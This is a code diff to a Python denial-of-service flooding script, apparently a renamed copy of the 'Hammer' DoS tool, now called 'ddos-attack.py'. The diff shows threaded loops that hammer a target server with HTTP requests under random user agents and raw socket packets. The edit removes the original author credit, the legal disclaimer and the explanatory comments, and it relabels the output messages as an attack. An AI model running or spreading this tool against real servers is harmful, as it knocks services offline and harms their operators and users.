@@ -27,7 +27,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mbot is attack...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -41,14 +41,14 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent!--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
 		print("\033[91mno connection! server maybe down\033[0m")
-		#print("\033[91m",e,"\033[0m")
+		
 		time.sleep(.1)
 
 
@@ -67,10 +67,8 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
+	print (''' \033[32m	
+	usage : python3 ddos-attack.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
 	-p : port default 80
@@ -107,15 +105,13 @@ def get_parameters():
 		thr = opts.turbo
 
 
-# reading headers
 global data
 headers = open("headers.txt", "r")
 data = headers.read()
 headers.close()
-#task queue are q,w
+
 q = Queue()
 w = Queue()
-
 
 if __name__ == '__main__':
 	if len(sys.argv) < 2:
@@ -136,16 +132,16 @@ if __name__ == '__main__':
 	while True:
 		for i in range(int(thr)):
 			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread is exist, it dies
+			t.daemon = True  
 			t.start()
 			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
+			t2.daemon = True  
 			t2.start()
 		start = time.time()
-		#tasking
+		
 		item = 0
 		while True:
-			if (item>1800): # for no memory crash
+			if (item>1800): 
 				item=0
 				time.sleep(.1)
 			item = item + 1
